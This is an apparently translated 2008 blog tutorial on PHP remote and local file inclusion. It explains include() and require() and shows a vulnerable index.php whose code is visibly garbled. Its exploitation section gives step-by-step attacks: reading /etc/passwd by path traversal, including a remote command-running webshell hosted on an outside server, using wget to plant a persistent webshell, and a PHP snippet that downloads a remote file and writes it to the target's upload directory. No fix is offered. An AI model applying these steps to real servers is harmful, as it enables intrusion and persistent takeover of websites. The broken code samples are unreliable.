The principle of remote inclusion and local inclusion vulnerabilities

by xloong on 2008-05-14 22:41:55

### First, let's discuss file inclusion vulnerabilities. The first question is: what exactly is a "Remote File Inclusion Vulnerability"? The answer is: when a server includes arbitrary files using PHP features (functions), and the source of the file to be included is not strictly filtered, it may allow the inclusion of a malicious file. We can construct this malicious file to achieve malicious purposes. Almost all CGI programs have such bugs; they just manifest differently.

#### One: Dangerous Functions Involved [include(), require(), include_once(), require_once()]

**include() && require() Statements:** Include and execute the specified file.

These two structures are identical in every way except for how they handle failures. **include()** generates a warning while **require()** causes a fatal error. In other words, if you want to stop processing the page upon encountering a missing file, use **require()**. With **include()**, the script continues to run.

If "allow_url_fopen" is enabled in PHP (default configuration), you can also specify a URL (via HTTP or another supported protocol) instead of a local file to include. If the target server interprets the target file as PHP code, variables can be passed to the included file via an HTTP GET request string.

**require_once() && include_once()**

The **require_once()** and **include_once()** statements include and execute the specified file during script execution. This behavior is similar to the **require()** statement, with the only difference being that if the code in the file has already been included, it will not be included again. This is useful when the same file might be included more than once during script execution, ensuring it is only included once to avoid issues like function redefinition or variable reassignment.

#### Two: Why Include Files?

When programmers write code, they dislike repeating tasks and prefer not to rewrite the same code (e.g., common functions). Therefore, they place reusable code in a separate file, such as `share.php`, and then include and call it in other files. In PHP, we use the functions mentioned earlier to achieve this. For example, if you want to include `share.php` in `main.php`, you would write `include("share.php")`. Then, you can use the functions defined in `share.php`. Hardcoding the file name for inclusion generally poses no problem or vulnerability. So, where does the issue arise?

Sometimes, it's unclear which file needs to be included. Consider the following code from `index.php`:

```php

if ([page]) {

include GET[page];

} else {

include "home.";

}

```

This is a typical piece of PHP code. How does it work? It involves the meaning of GET, which I won't explain here (it could lead to another article on HTTP). If you're unfamiliar with GET, POST, etc., you should research these topics further.

The usage format of the above code might look like this: `http://www.1steam.cn/php/index.php?page=main.php` or `http://www.1steam.cn/php/index.php?page=downloads.php`. Here's a brief explanation of how it works:

1. Submit the URL, and `index.php` retrieves the value of `page` (`_GET[page]`).

2. Check if `GET[page]` is empty. If not (in this case, `main.php`), include this file.

3. If `_GET[page]` is empty, execute the `else` block and include `home.php`.

#### Three: Why Does a Vulnerability Occur?

You might think this is great—it allows dynamic file inclusion based on the URL. How could there be a vulnerability? The answer lies in our mischievous nature—we don’t always follow the intended links. Instead, we might try to include (or call) our own files. For example, we might enter the following URL: `http://www.1steam.cn/php/index.php?page=hello.php`. Our `index.php` program would then blindly execute the steps described above: retrieve `page` as `hello.php` and include it. However, since `hello.php` doesn't exist, it generates a warning similar to the following:

```

Warning: include(hello.php) [function.include]: failed to open stream: No such file or directory in /vhost/wwwroot/php/index.php on line 3

Warning: include() [function.include]: Failed opening 'hello.php' for inclusion (include_path='.:') in /vhost/wwwroot/php/index.php on line 3

```

Note the Warning indicates that the specified `hello.php` file was not found, meaning the file at the specified path couldn't be included. The subsequent warning arises because the specified file wasn't found, resulting in an inclusion warning.

#### Four: How to Exploit

As seen above, problems arise. How do we exploit such vulnerabilities? There are many methods, but fundamentally, they are similar. Here are three common exploitation techniques:

1. **Include and Read Other Files on the Target Machine**

From the previous discussion, due to the lack of filtering for the parameter `page`, we can arbitrarily specify other sensitive files on the target machine. For instance, in the earlier warnings, we saw the exposed absolute path (`vhost/wwwroot/php/`). We can repeatedly probe to include other files. For example, specifying the URL as `http://www.1steam.cn/php/index.php?page=./txt.txt` reads the `txt.txt` file in the current directory. You can also use `../` for directory traversal (if not filtered); or directly specify an absolute path to read sensitive system files. For instance, this URL: `http://www.1steam.cn/php/index.php?page=/etc/passwd`. If the target host doesn't restrict permissions strictly or if the Apache startup permission is high enough, it can read the content of this file. Otherwise, you'll receive a warning similar to: `open_basedir restriction in effect.`

2. **Include and Execute a PHP Webshell**

If the target host has "allow_url_fopen" enabled (which is enabled by default and rarely modified), we can expand our exploitation space. We can specify a webshell containing PHP code from another URL to execute directly. For example, I could write a PHP script that executes commands (with comments for clarity) and save it as `cmd.txt` (the extension isn't important as long as the content is in PHP format).

This file accepts a command specified by `cmd` and uses the `passthru` function to execute it, returning the output between `` tags. Save this file on our server (even one that doesn't support PHP, as long as it's accessible via HTTP), such as `http://www.1ster.cn/cmd.txt`. Then, we can construct the following URL to exploit the vulnerability: `http://www.1steam.cn/php/index.php?page=http://www.1ster.cn/cmd.txt?cmd=ls`. The command after `cmd` is the one you wish to execute. Other common commands (for *UNIX systems) include:

```

ll - List directories and files (equivalent to Windows' dir)

pwd - Show the current absolute path

id whoami - Show the current user

wget - Download a file from a specified URL

```

Using this method, you obtain a Webshell (even though the PHP file isn't on the target machine, it still acts as a Webshell).

3. **Include a PHP File That Creates Another File**

Some might prefer obtaining a real Webshell on the target machine rather than relying on a "pseudo" Webshell. What if the inclusion vulnerability is patched one day? To get a real Webshell, here are two common methods:

**1) Use wget to Download a Webshell**

This is relatively simple and commonly used. In the pseudo-webshell obtained earlier, you can execute commands. Call `wget`, a powerful tool with numerous parameters (Google it for more details). For our purposes, we only need the `-O` option (`--output-document=FILE`, writes the document to FILE).

Assume you've placed a Webshell containing PHP code in a location accessible via HTTP or FTP, such as `http://www.1ster.cn/1stphp.txt`. Then, in the pseudo-webshell obtained earlier, execute the following URL: `http://www.1steam.cn/php/index.php?page=http://www.1ster.cn/cmd.txt?cmd=wget http://www.1ster.cn/1stphp.txt -O 1stphp.php`. If the current directory is writable, you'll obtain a Webshell named `1stphp.php`. If not, you'll need to find another way.

**2) Create a File Using PHP Script**

The previous `wget` method might encounter issues if the current directory isn't writable or if the target host has disabled (or not installed) `wget`. In such cases, we need to adapt. We can combine the file inclusion vulnerability to include a PHP script that creates (writes) a file, as follows:

```php

$f = file_get_contents("http://www.1ster.cn/1stphp.txt"); // Open the file stream from the specified URL

$h = fopen("./upload/1st.php", "a"); // Find a writable directory and create a file

fwrite($h, $f); // Write the opened file stream into the created file

fclose($h); // Close and save the file

```

This script writes the PHP file downloaded earlier using `wget`, but now we've improved the method by implementing it with a PHP script. You can use `cmd.php?cmd=ll` to find writable directories (e.g., `upload`) and create the file in that directory: `./upload/1st.php`. You then obtain your Webshell.
